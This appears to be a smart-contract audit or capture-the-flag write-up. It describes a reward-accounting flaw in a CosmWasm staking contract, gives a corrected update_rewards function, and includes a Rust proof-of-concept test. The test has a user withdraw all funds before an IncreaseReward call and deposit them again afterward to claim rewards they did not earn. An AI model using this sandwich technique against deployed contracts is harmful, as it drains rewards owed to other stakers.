issue:
update_rewards() doesn't actually update the user_index in some cases!
    // no need update amount if zero
    if user.staked_amount.is_zero() {
        return;
    }
If you don't update the user_index, a user can just keep making their rewards share
increase monotonically by withdrawing their full amount before an increase_reward()
and depositing it again after.

You can see here in deposit that the staked_amount and total_staked are increased:
    // update rewards
    update_rewards(&mut user, &state);

    // increase user amount
    user.staked_amount += amount;

    // increase total staked amount
    state.total_staked += amount;
If a previous user's staked_amount has decreased to 0, then deposit() will use the old index.
Just simply sandwich an increase_reward() call, by withdrawing all your funds before, then depositing
them after, and then you will be able to claim an increased rewards amount.

fix:
pub fn update_rewards(user: &mut UserRewardInfo, state: &State) {
    // calculate pending rewards
    let reward = (state.global_index - user.user_index) * user.staked_amount;
    user.pending_rewards += reward;

    user.user_index = state.global_index;
}

PoC test:
    #[test]
    fn exploit() {
        let (mut app, contract_addr) = proper_instantiate();

        // new user2 join
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // sandwich
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Withdraw {
                amount: Uint128::new(10_000),
            },
            &[],
        )
        .unwrap();

        // owner increases reward
        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(10_000, REWARD_DENOM)],
        )
        .unwrap();

        let user_info_before: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER2.to_string(),
                },
            )
            .unwrap();

        // sandwich
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        let user_info_after: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER2.to_string(),
                },
            )
            .unwrap();
        // our shares should only be 5_000
        assert_eq!(user_info_after.pending_rewards, Uint128::new(10_000));
        let didincrease: bool = user_info_after.pending_rewards > user_info_before.pending_rewards;
        assert_eq!(didincrease, true);

        // user2 claim rewards
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::ClaimRewards {},
            &[],
        )
        .unwrap();

        // user2 receives reward denom
        let balance = app
            .wrap()
            .query_balance(USER2.to_string(), REWARD_DENOM)
            .unwrap()
            .amount;

        assert_eq!(balance, user_info_after.pending_rewards);

    }
